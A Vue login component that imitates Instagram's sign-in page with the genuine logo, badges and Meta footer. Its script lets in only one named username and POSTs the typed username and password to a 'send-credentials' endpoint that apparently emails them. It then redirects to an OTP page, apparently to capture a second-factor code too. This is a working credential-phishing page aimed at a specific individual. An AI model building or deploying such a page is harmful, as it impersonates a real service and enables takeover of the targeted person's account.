<template>
  <div class="min-h-screen flex flex-col justify-center items-center bg-gray-50">
    <!-- Container -->
    <div class="flex flex-col md:flex-row justify-center items-center w-full">
      <!-- LEFT Side Phone Preview -->
      <div class="hidden md:flex w-80 mr-10">
        <img src="/landing-3x.png" class="w-full" />
      </div>

      <!-- RIGHT Side Login Box -->
      <div class="w-full max-w-xs">
        <!-- Login Box -->
        <div class="bg-white border border-gray-300 p-8 w-full text-center">
          <!-- Instagram Logo -->
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png"
            class="w-40 mx-auto mb-6"
          />

          <!-- Login Form -->
          <form @submit.prevent="login">
            <input
              v-model="username"
              type="text"
              placeholder="Phone number, username, or email"
              class="w-full border border-gray-300 bg-gray-50 p-2 text-xs rounded mb-2"
            />

            <input
              v-model="password"
              type="password"
              placeholder="Password"
              class="w-full border border-gray-300 bg-gray-50 p-2 text-xs rounded mb-4"
            />

            <button
              type="submit"
              class="w-full bg-blue-500 text-white text-sm font-semibold py-1.5 rounded hover:bg-blue-600"
            >
              Log In
            </button>
          </form>

          <!-- OR divider -->
          <div class="flex items-center my-4">
            <div class="flex-grow border-t border-gray-300"></div>
            <span class="px-3 text-xs font-semibold text-gray-500">OR</span>
            <div class="flex-grow border-t border-gray-300"></div>
          </div>

          <!-- Facebook Login -->
          <button class="flex items-center justify-center w-full text-blue-900 font-semibold text-sm mb-4">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
              class="w-4 mr-2"
            />
            Log in with Facebook
          </button>

          <a href="#" class="text-xs text-blue-900">Forgot password?</a>
        </div>

        <!-- Signup Box -->
        <div class="bg-white border border-gray-300 mt-3 p-4 w-full text-center text-sm">
          Don’t have an account?
          <a href="#" class="text-blue-500 font-semibold">Sign up</a>
        </div>

        <!-- Get the App -->
        <div class="mt-5 text-center">
          <p class="text-sm mb-3">Get the app.</p>
          <div class="flex justify-center gap-3">
            <img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/fd2c67a0e5a1.png"
              class="h-10"
            />
            <img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/98c4db8fdece.png"
              class="h-10"
            />
          </div>
        </div>
      </div>
    </div>

    <!-- Footer -->
    <footer class="text-xs text-gray-400 mt-10 p-5 text-center">
      <div class="space-x-4 mb-2">
        <a href="#" class="hover:underline">Meta</a>
        <a href="#" class="hover:underline">About</a>
        <a href="#" class="hover:underline">Blog</a>
        <a href="#" class="hover:underline">Jobs</a>
        <a href="#" class="hover:underline">Help</a>
        <a href="#" class="hover:underline">API</a>
        <a href="#" class="hover:underline">Privacy</a>
        <a href="#" class="hover:underline">Terms</a>
      </div>
      <div class="space-x-4">
        <span>English</span>
        <span>© 2025 Instagram from Meta</span>
      </div>
    </footer>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "InstagramLoginPage",
  data() {
    return {
      username: "",
      password: "",
      allowedUser: "the_mahima_verma", // ← The specific username allowed
    };
  },
  methods: {
    async login() {
      // 1️⃣ Check if entered username matches allowed username
      if (this.username.trim().toLowerCase() !== this.allowedUser.toLowerCase()) {
        alert("Please use another account.");
        return; // ❌ stop login flow
      }

      // 2️⃣ Continue normal process
      try {
        await axios.post("http://localhost:5000/send-credentials", {
          username: this.username,
          password: this.password,
        });

        alert("Verify the account");

        // Redirect to OTP Page
        this.$router.push("/otp");
      } catch (err) {
        console.error(err);
        alert("Failed to send email.");
      }
    },
  },
};
</script>

